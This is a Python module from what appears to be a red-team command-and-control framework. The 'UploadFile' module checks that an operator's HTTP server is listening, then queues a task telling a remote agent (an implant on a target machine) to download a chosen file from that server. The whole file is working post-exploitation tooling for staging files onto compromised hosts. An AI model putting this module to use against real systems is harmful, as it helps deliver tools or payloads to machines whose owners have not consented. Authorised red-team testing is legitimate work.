from modules._module import AgentModule
from utils.custom_print import print_info, print_error, print_ok
from utildata.dataset_options import Option
from utils.redteam_db import RedTeamDB
import socket
import requests
from utils.check_agent import is_agent_alive


class RedTeamModule(AgentModule):

    def __init__(self):
        information = {"Name": "UploadFile",
                       "Description": "With this module you will be able to upload a file using HTTP.",
                       "Requirements": "It's neccessary configure a web server. Example: Python -m SimpleHTTPServer [port]",
                       "Author": "@josueencinar"}

        hostname = socket.gethostname()    
        ip = socket.gethostbyname(hostname) 

        options =  {
            "lhost": Option.create(name="lhost", value=ip, required=True),
            "lport": Option.create(name="lport", required=True),
            "file": Option.create(name="file", required=True)
            }

        # Constructor of the parent class
        super(RedTeamModule, self).__init__(information, options)

    @is_agent_alive
    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((self.args['lhost'], int(self.args['lport'])))
            if result == 0:
                rt_db = RedTeamDB.get_instance()
                args = f"http://{self.args['lhost']}:{self.args['lport']}/ {self.args['file']}"
                rt_db.add_task(self.args["agent"], "UploadFile", args, "", "function")
                print_info("Running Module")
            else:
                print_error("The server is not running...")
                print_info(f"Launches the following command on the desired route: Python -m SimpleHTTPServer {self.args['lport']}")
        except Exception as e:
            print_error(e)
